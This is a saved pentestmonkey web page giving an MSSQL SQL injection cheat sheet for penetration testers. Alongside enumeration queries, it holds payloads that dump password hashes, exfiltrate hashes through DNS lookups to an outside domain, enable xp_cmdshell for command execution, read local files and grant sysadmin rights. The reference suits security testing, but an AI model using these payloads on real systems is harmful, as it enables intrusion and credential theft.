<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US"><head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>MSSQL Injection Cheat Sheet | pentestmonkey</title>
<link rel="stylesheet" href="MSSQL%20Injection%20Cheat%20Sheet%20_%20pentestmonkey_files/style.css" type="text/css" media="screen">
<link rel="pingback" href="https://pentestmonkey.net/xmlrpc.php">
<meta name="robots" content="max-image-preview:large">
	<style>img:is([sizes="auto" i], [sizes^="auto," i]) { contain-intrinsic-size: 3000px 1500px }</style>
	<link rel="alternate" type="application/rss+xml" title="pentestmonkey » Feed" href="https://pentestmonkey.net/feed">
<link rel="alternate" type="application/rss+xml" title="pentestmonkey » Comments Feed" href="https://pentestmonkey.net/comments/feed">
<link rel="alternate" type="application/rss+xml" title="pentestmonkey » MSSQL Injection Cheat Sheet Comments Feed" href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet/feed">
<script type="text/javascript">
/* <![CDATA[ */
window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/16.0.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/pentestmonkey.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=6.8.2"}};
/*! This file is auto-generated */
!function(s,n){var o,i,e;function c(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function p(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data),a=(e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0),new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data));return t.every(function(e,t){return e===a[t]})}function u(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);for(var n=e.getImageData(16,16,1,1),a=0;a<n.data.length;a++)if(0!==n.data[a])return!1;return!0}function f(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\udedf")}return!1}function g(e,t,n,a){var r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):s.createElement("canvas"),o=r.getContext("2d",{willReadFrequently:!0}),i=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(function(e){i[e]=t(o,e,n,a)}),i}function t(e){var t=s.createElement("script");t.src=e,t.defer=!0,s.head.appendChild(t)}"undefined"!=typeof Promise&&(o="wpEmojiSettingsSupports",i=["flag","emoji"],n.supports={everything:!0,everythingExceptFlag:!0},e=new Promise(function(e){s.addEventListener("DOMContentLoaded",e,{once:!0})}),new Promise(function(t){var n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+g.toString()+"("+[JSON.stringify(i),f.toString(),p.toString(),u.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"}),r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=function(e){c(n=e.data),r.terminate(),t(n)})}catch(e){}c(n=g(i,f,p,u))}t(n)}).then(function(e){for(var t in e)n.supports[t]=e[t],n.supports.everything=n.supports.everything&&n.supports[t],"flag"!==t&&(n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&n.supports[t]);n.supports.everythingExceptFlag=n.supports.everythingExceptFlag&&!n.supports.flag,n.DOMReady=!1,n.readyCallback=function(){n.DOMReady=!0}}).then(function(){return e}).then(function(){var e;n.supports.everything||(n.readyCallback(),(e=n.source||{}).concatemoji?t(e.concatemoji):e.wpemoji&&e.twemoji&&(t(e.twemoji),t(e.wpemoji)))}))}((window,document),window._wpemojiSettings);
/* ]]> */
</script>
<style id="wp-emoji-styles-inline-css" type="text/css">

	img.wp-smiley, img.emoji {
		display: inline !important;
		border: none !important;
		box-shadow: none !important;
		height: 1em !important;
		width: 1em !important;
		margin: 0 0.07em !important;
		vertical-align: -0.1em !important;
		background: none !important;
		padding: 0 !important;
	}
</style>
<link rel="stylesheet" id="wp-block-library-css" href="MSSQL%20Injection%20Cheat%20Sheet%20_%20pentestmonkey_files/style.min.css" type="text/css" media="all">
<style id="classic-theme-styles-inline-css" type="text/css">
/*! This file is auto-generated */
.wp-block-button__link{color:#fff;background-color:#32373c;border-radius:9999px;box-shadow:none;text-decoration:none;padding:calc(.667em + 2px) calc(1.333em + 2px);font-size:1.125em}.wp-block-file__button{background:#32373c;color:#fff;text-decoration:none}
</style>
<style id="global-styles-inline-css" type="text/css">
:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
:root :where(.wp-block-pullquote){font-size: 1.5em;line-height: 1.6;}
</style>
<link rel="https://api.w.org/" href="https://pentestmonkey.net/wp-json/"><link rel="alternate" title="JSON" type="application/json" href="https://pentestmonkey.net/wp-json/wp/v2/posts/88"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://pentestmonkey.net/xmlrpc.php?rsd">
<link rel="canonical" href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">
<link rel="shortlink" href="https://pentestmonkey.net/?p=88">
<link rel="alternate" title="oEmbed (JSON)" type="application/json+oembed" href="https://pentestmonkey.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpentestmonkey.net%2Fcheat-sheet%2Fsql-injection%2Fmssql-sql-injection-cheat-sheet">
<link rel="alternate" title="oEmbed (XML)" type="text/xml+oembed" href="https://pentestmonkey.net/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fpentestmonkey.net%2Fcheat-sheet%2Fsql-injection%2Fmssql-sql-injection-cheat-sheet&amp;format=xml">
	
<!--[if IE 6]><script src="https://pentestmonkey.net/wp-content/themes/baza-noclegowa/js/DD_belatedPNG.js"></script><![endif]-->
<script src="MSSQL%20Injection%20Cheat%20Sheet%20_%20pentestmonkey_files/wp-emoji-release.min.js" defer="defer"></script></head>
<body class="wp-singular post-template-default single single-post postid-88 single-format-standard wp-theme-baza-noclegowa">
	<div class="all-page">
		
		<div class="container">
			
			<!-- HEADER -->
			<div id="header">
			    <div class="website-name"><a href="https://pentestmonkey.net/">pentestmonkey</a></div>
				<div class="slogan">Taking the monkey work out of pentesting</div>
			</div>
			<div class="clear"></div>
			<!-- /HEADER -->

			<!-- main NAVIGATION -->
			<div id="mainNav">
				<div class="wrap">
    <ul id="menu-cheat-sheets" class="menu"><li id="menu-item-133" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-133"><a href="https://pentestmonkey.net/category/site-news"><span>Site News</span></a></li>
<li id="menu-item-130" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-130"><a href="https://pentestmonkey.net/category/blog"><span>Blog</span></a></li>
<li id="menu-item-136" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-136"><a href="https://pentestmonkey.net/category/tools"><span>Tools</span></a></li>
<li id="menu-item-137" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-137"><a href="https://pentestmonkey.net/category/yaptest"><span>Yaptest</span></a></li>
<li id="menu-item-134" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-134"><a href="https://pentestmonkey.net/category/cheat-sheet"><span>Cheat Sheets</span></a></li>
<li id="menu-item-135" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-135"><a href="https://pentestmonkey.net/category/contact"><span>Contact</span></a></li>
</ul>    <div class="clear"><!-- --></div>
				</div>
			</div>
			<!-- /main NAVIGATION -->
			<div class="clear"></div>


			<!-- CONTENT -->
			<div id="content">
	<!-- Start: Left Panel -->
	<div class="content">

	
		<div class="post-88 post type-post status-publish format-standard hentry category-sql-injection tag-cheatsheet tag-mssql tag-sqlinjection" id="post-88">
			<h1>MSSQL Injection Cheat Sheet</h1>

			<div class="entryContent">
				<p>Some useful syntax reminders for SQL Injection into MSSQL databases…<br>
<span id="more-88"></span></p>
<p>This post is part of a series of SQL Injection Cheat Sheets.&nbsp; In
 this series, I’ve endevoured to tabulate the data to make it easier to 
read and to use the same table for for each database backend.&nbsp; This
 helps to highlight any features which are lacking for each database, 
and enumeration techniques that don’t apply and also areas that I 
haven’t got round to researching yet.</p>
<p>The complete list of SQL Injection Cheat Sheets I’m working is:</p>
<ul>
<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
</ul>
<p>I’m not planning to write one for MS Access, but there’s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
<p>Some of the queries in the table below can only be run by an admin. These are marked with “– priv” at the end of the query.</p>
<table border="1">
<tbody>
<tr>
<td>Version</td>
<td>SELECT @@version</td>
</tr>
<tr>
<td>Comments</td>
<td>SELECT 1 — comment<br>
SELECT /*comment*/1</td>
</tr>
<tr>
<td>Current User</td>
<td>SELECT user_name();<br>
SELECT system_user;<br>
SELECT user;<br>
SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID</td>
</tr>
<tr>
<td>List Users</td>
<td>SELECT name FROM master..syslogins</td>
</tr>
<tr>
<td>List Password Hashes</td>
<td>SELECT name, password FROM master..sysxlogins — priv, mssql 2000;<br>
SELECT name, master.dbo.fn_varbintohexstr(password) FROM 
master..sysxlogins — priv, mssql 2000.&nbsp; Need to convert to hex to 
return hashes in MSSQL error message / some version of query analyzer.<br>
SELECT name, password_hash FROM master.sys.sql_logins — priv, mssql 2005;<br>
SELECT name + ‘-‘ + master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins — priv, mssql 2005</td>
</tr>
<tr>
<td>&nbsp;Password Cracker</td>
<td>MSSQL 2000 and 2005 Hashes are both SHA1-based.&nbsp; <a href="https://labs.portcullis.co.uk/application/phrasen-drescher/">phrasen|drescher</a> can crack these.</td>
</tr>
<tr>
<td>List Privileges</td>
<td>— current privs on a particular object in 2005, 2008<br>
SELECT permission_name FROM master..fn_my_permissions(null, ‘DATABASE’); — current database<br>
SELECT permission_name FROM master..fn_my_permissions(null, ‘SERVER’); — current server<br>
SELECT permission_name FROM master..fn_my_permissions(‘master..syslogins’, ‘OBJECT’); –permissions on a table<br>
SELECT permission_name FROM master..fn_my_permissions(‘sa’, ‘USER’);<p></p>
<p>–permissions on a user– current privs in 2005, 2008<br>
SELECT is_srvrolemember(‘sysadmin’);<br>
SELECT is_srvrolemember(‘dbcreator’);<br>
SELECT is_srvrolemember(‘bulkadmin’);<br>
SELECT is_srvrolemember(‘diskadmin’);<br>
SELECT is_srvrolemember(‘processadmin’);<br>
SELECT is_srvrolemember(‘serveradmin’);<br>
SELECT is_srvrolemember(‘setupadmin’);<br>
SELECT is_srvrolemember(‘securityadmin’);</p>
<p>— who has a particular priv? 2005, 2008<br>
SELECT name FROM master..syslogins WHERE denylogin = 0;<br>
SELECT name FROM master..syslogins WHERE hasaccess = 1;<br>
SELECT name FROM master..syslogins WHERE isntname = 0;<br>
SELECT name FROM master..syslogins WHERE isntgroup = 0;<br>
SELECT name FROM master..syslogins WHERE sysadmin = 1;<br>
SELECT name FROM master..syslogins WHERE securityadmin = 1;<br>
SELECT name FROM master..syslogins WHERE serveradmin = 1;<br>
SELECT name FROM master..syslogins WHERE setupadmin = 1;<br>
SELECT name FROM master..syslogins WHERE processadmin = 1;<br>
SELECT name FROM master..syslogins WHERE diskadmin = 1;<br>
SELECT name FROM master..syslogins WHERE dbcreator = 1;<br>
SELECT name FROM master..syslogins WHERE bulkadmin = 1;</p></td>
</tr>
<tr>
<td>List DBA Accounts</td>
<td>SELECT is_srvrolemember(‘sysadmin’); — is your account a 
sysadmin?&nbsp; returns 1 for true, 0 for false, NULL for invalid 
role.&nbsp; Also try ‘bulkadmin’, ‘systemadmin’ and other values from 
the <a href="http://msdn.microsoft.com/en-us/library/ms176015.aspx">documentation<br>
</a> SELECT is_srvrolemember(‘sysadmin’, ‘sa’); — is sa a sysadmin? return 1 for true, 0 for false, NULL for invalid role/username.<br>
SELECT name FROM&nbsp;master..syslogins WHERE sysadmin = ‘1’ — tested on 2005</td>
</tr>
<tr>
<td>Current Database</td>
<td>SELECT DB_NAME()</td>
</tr>
<tr>
<td>List Databases</td>
<td>SELECT name FROM master..sysdatabases;<br>
SELECT DB_NAME(N); — for N = 0, 1, 2, …</td>
</tr>
<tr>
<td>List Columns</td>
<td>SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = ‘mytable’); — for the current DB only<br>
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM
 master..syscolumns, master..sysobjects WHERE 
master..syscolumns.id=master..sysobjects.id AND 
master..sysobjects.name=’sometable’; — list colum names and types for 
master..sometable</td>
</tr>
<tr>
<td>List Tables</td>
<td>SELECT name FROM master..sysobjects WHERE xtype = ‘U’; — use xtype = ‘V’ for views<br>
SELECT name FROM someotherdb..sysobjects WHERE xtype = ‘U’;<br>
SELECT master..syscolumns.name, TYPE_NAME(master..syscolumns.xtype) FROM
 master..syscolumns, master..sysobjects WHERE 
master..syscolumns.id=master..sysobjects.id AND 
master..sysobjects.name=’sometable’; — list colum names and types for 
master..sometable</td>
</tr>
<tr>
<td>Find Tables From Column Name</td>
<td>— NB: This example works only for the current database.&nbsp; If you
 wan’t to search another db, you need to specify the db name (e.g. 
replace sysobject with mydb..sysobjects).<br>
SELECT sysobjects.name as tablename, syscolumns.name as columnname FROM 
sysobjects JOIN syscolumns ON sysobjects.id = syscolumns.id WHERE 
sysobjects.xtype = ‘U’ AND syscolumns.name LIKE ‘%PASSWORD%’ — this 
lists table, column for each column containing the word ‘password’</td>
</tr>
<tr>
<td>Select Nth Row</td>
<td>SELECT TOP 1 name FROM (SELECT TOP 9 name FROM master..syslogins ORDER BY name ASC) sq ORDER BY name DESC — gets 9th row</td>
</tr>
<tr>
<td>Select Nth Char</td>
<td>SELECT substring(‘abcd’, 3, 1) — returns c</td>
</tr>
<tr>
<td>Bitwise AND</td>
<td>SELECT 6 &amp; 2 — returns 2<br>
SELECT 6 &amp; 1 — returns 0</td>
</tr>
<tr>
<td>ASCII Value -&gt; Char</td>
<td>SELECT char(0x41) — returns A</td>
</tr>
<tr>
<td>Char -&gt; ASCII Value</td>
<td>SELECT ascii(‘A’) – returns 65</td>
</tr>
<tr>
<td>Casting</td>
<td>SELECT CAST(‘1’ as int);<br>
SELECT CAST(1 as char)</td>
</tr>
<tr>
<td>String Concatenation</td>
<td>SELECT ‘A’ + ‘B’ – returns AB</td>
</tr>
<tr>
<td>If Statement</td>
<td><span>IF (1=1) SELECT 1 ELSE SELECT 2 — returns 1</span></td>
</tr>
<tr>
<td>Case Statement</td>
<td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END — returns 1</td>
</tr>
<tr>
<td>Avoiding Quotes</td>
<td>SELECT char(65)+char(66) — returns AB</td>
</tr>
<tr>
<td>Time Delay</td>
<td>&nbsp;WAITFOR DELAY ‘0:0:5’ — pause for 5 seconds</td>
</tr>
<tr>
<td>Make DNS Requests</td>
<td>declare @host varchar(800); select @host = name FROM 
master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + 
‘c$boot.ini”’); — nonpriv, works on 2000declare @host varchar(800); 
select @host = name + ‘-‘ + master.sys.fn_varbintohexstr(password_hash) +
 ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + 
@host + ‘c$boot.ini”’); — priv, works on 2005– NB: Concatenation is not 
allowed in calls to these SPs, hence why we have to use @host.&nbsp; 
Messy but necessary.<br>
— Also check out theDNS tunnel feature of <a href="http://sqlninja.sourceforge.net/sqlninja-howto.html">sqlninja</a></td>
</tr>
<tr>
<td>Command Execution</td>
<td>EXEC xp_cmdshell ‘net user’; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:<br>
EXEC sp_configure ‘show advanced options’, 1; — priv<br>
RECONFIGURE; — priv<br>
EXEC sp_configure ‘xp_cmdshell’, 1; — priv<br>
RECONFIGURE; — priv</td>
</tr>
<tr>
<td>Local File Access</td>
<td>CREATE TABLE mydata (line varchar(8000));<br>
BULK INSERT mydata FROM ‘c:boot.ini’;<br>
DROP TABLE mydata;</td>
</tr>
<tr>
<td>Hostname, IP Address</td>
<td>SELECT HOST_NAME()</td>
</tr>
<tr>
<td>Create Users</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms173768.aspx">sp_addlogin</a> ‘user’, ‘pass’; — priv</td>
</tr>
<tr>
<td>Drop Users</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms189767.aspx">sp_droplogin</a> ‘user’; — priv</td>
</tr>
<tr>
<td>Make User DBA</td>
<td>EXEC <a href="http://msdn2.microsoft.com/en-us/library/ms186320.aspx">master.dbo.sp_addsrvrolemember</a> ‘user’, ‘sysadmin; — priv</td>
</tr>
<tr>
<td>Location of DB files</td>
<td>EXEC sp_helpdb master; –location of master.mdf<br>
EXEC sp_helpdb pubs; –location of pubs.mdf</td>
</tr>
<tr>
<td>Default/System Databases</td>
<td>northwind<br>
model<br>
msdb<br>
pubs — not on sql server 2005<br>
tempdb</td>
</tr>
</tbody>
</table>
<h3>Misc Tips</h3>
<p>In no particular order, here are some suggestions from pentestmonkey readers.</p>
<p><strong>From Dan Crowley:</strong><br>
<a href="http://www.notsosecure.com/folder2/2010/06/29/mysql-exploitation-with-error-messages">A way to extract data via SQLi with a MySQL backend</a></p>
<p><strong>From Jeremy Bae:</strong><br>
Tip about sp_helpdb – included in table above.</p>
<p><strong>From Trip:</strong><br>
List DBAs (included in table above now):</p>
<blockquote><p>select name from master..syslogins where sysadmin = ‘1’</p></blockquote>
<p><strong>From Daniele Costa:</strong><br>
Tips on using fn_my_permissions in 2005, 2008 – included in table above.<br>
Also:<br>
To check permissions on multiple database you will have to use the following pattern.</p>
<blockquote><p>USE [DBNAME]; select permission_name   FROM fn_my_permissions (NULL, ‘DATABASE’)</p></blockquote>
<p>Note also that in case of using this data with a UNION query a collation error could occur.<br>
In this case a simple trick is to use the following syntax:</p>
<blockquote><p> select permission_name collate database_default  FROM fn_my_permissions (NULL, ‘DATABASE’)
</p></blockquote>
                <div class="clear"></div>
								<p class="postmeta"><span class="tags"><a href="https://pentestmonkey.net/tag/cheatsheet" rel="tag">cheatsheet</a>, <a href="https://pentestmonkey.net/tag/mssql" rel="tag">mssql</a>, <a href="https://pentestmonkey.net/tag/sqlinjection" rel="tag">sqlinjection</a></span></p>				<p class="postmeta"><span class="cats"><a href="https://pentestmonkey.net/category/cheat-sheet/sql-injection" rel="category tag">SQL Injection</a></span></p>
								
			<p></p>
		
			<div class="navigation2">
				<div class="alignright prev"><a href="https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet" rel="prev">Oracle SQL Injection Cheat Sheet</a></div>
				<div class="alignleft next"><a href="https://pentestmonkey.net/blog/chroot-breakout-perl" rel="next">Breaking Out of a Chroot Jail Using PERL</a></div>
			</div>		

			</div>
		</div>

	
<!-- You can start editing here. -->


			<!-- If comments are open, but there are no comments. -->

	 
<p></p>
<br>


	<div id="respond" class="comment-respond">
